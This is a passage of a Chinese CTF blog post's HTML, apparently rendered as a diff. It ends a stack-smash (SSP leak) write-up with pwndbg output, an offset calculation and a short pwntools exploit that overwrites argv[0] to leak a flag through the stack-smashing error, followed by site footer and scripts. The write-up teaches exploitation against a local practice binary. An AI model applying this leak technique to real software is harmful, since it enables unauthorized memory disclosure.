0x400</span><br><span class="line">   0x401108 &lt;main+170&gt;    mov    rsi, rax</span><br><span class="line">────────────────────────[ STACK ]────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffcbe0 —▸ 0x7fffffffcdf8 —▸ 0x7fffffffd0d6 ◂— &apos;/home/pwn/Desktop/xpl&apos;</span><br><span class="line">01:0008│      0x7fffffffcbe8 ◂— 0x100000000</span><br><span class="line">02:0010│      0x7fffffffcbf0 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffcbf8 —▸ 0x6c7d40 ◂— 0x0</span><br><span class="line">04:0020│ rsi  0x7fffffffcc00 ◂— &apos;flag&#123;stack_smash&#125;\n&apos;</span><br><span class="line">05:0028│      0x7fffffffcc08 ◂— &apos;ck_smash&#125;\n&apos;</span><br><span class="line">06:0030│      0x7fffffffcc10 ◂— 0xa7d /* &apos;&#125;\n&apos; */</span><br><span class="line">07:0038│      0x7fffffffcc18 —▸ 0x401840 (__libc_csu_fini) ◂— push   rbx</span><br></pre></td></tr></table></figure></p>
+<p>发现程序一开始输出的地址，就是v5所在的栈地址，也就是flag的地址，步骤如下：<br>找到__libc_argv[0]的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43:0218│ rsi  0x7fffffffcdf8 —▸ 0x7fffffffd0d6 ◂— &apos;/home/pwn/Desktop/xpl&apos;</span><br></pre></td></tr></table></figure></p>
+<p>计算出偏移量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r rbp</span><br><span class="line">rbp            0x7fffffffcd10   0x7fffffffcd10</span><br><span class="line">pwndbg&gt; x /gx 0x7fffffffcd10-0x90</span><br><span class="line">0x7fffffffcc80: 0x000000037ffffa00</span><br><span class="line">pwndbg&gt; distance 0x7fffffffcc80 0x7fffffffcdf8</span><br><span class="line">0x7fffffffcc80-&gt;0x7fffffffcdf8 is 0x178 bytes (0x2f words)</span><br></pre></td></tr></table></figure></p>
+<p>获取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./xpl&apos;)</span><br><span class="line">data = sh.recvuntil(&quot;username?&quot;)</span><br><span class="line">address = p64(int(data.split()[4], 16))</span><br><span class="line">sh.send(&quot;A&quot;*0x178 + address)</span><br><span class="line">print sh.recvline()</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./xpl&apos;: pid 4363</span><br><span class="line"> *** stack smashing detected ***: flag&#123;stack_smash&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    bey0ndm3
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2021/03/14/1/">栈溢出技巧(三)</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2021年03月14日 - 22:03
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2021/03/14/1/" title="栈溢出技巧(三)">http://1234xxh.github.io/2021/03/14/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/26/1/" rel="next" title="栈溢出技巧(二)">
+                <i class="fa fa-chevron-left"></i> 栈溢出技巧(二)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/25/1/" rel="prev" title="栈溢出技巧(四)">
+                栈溢出技巧(四) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/background.jpg"
+                alt="bey0ndm3" />
+            
+              <p class="site-author-name" itemprop="name">bey0ndm3</p>
+              <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/virgilwjj/" title="virgilwjj" target="_blank">virgilwjj</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基于报错类的栈保护"><span class="nav-number">1.</span> <span class="nav-text">基于报错类的栈保护</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-smash原理"><span class="nav-number">2.</span> <span class="nav-text">stack smash原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目一"><span class="nav-number">3.</span> <span class="nav-text">题目一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目二"><span class="nav-number">4.</span> <span class="nav-text">题目二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目三"><span class="nav-number">5.</span> <span class="nav-text">题目三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目四"><span class="nav-number">6.</span> <span class="nav-text">题目四</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bey0ndm3</span>
+
+  
+</div>
+
+<p>My way of tramp journey is from the galaxy's firmament to the starry ocean.</p>    <!--文字-->
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3zIUNafVjzYQz7AJMe457cT0-gzGzoHsz", "PzPKmCfoYOpSgHcoyql6etIG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+</body>
+</html>
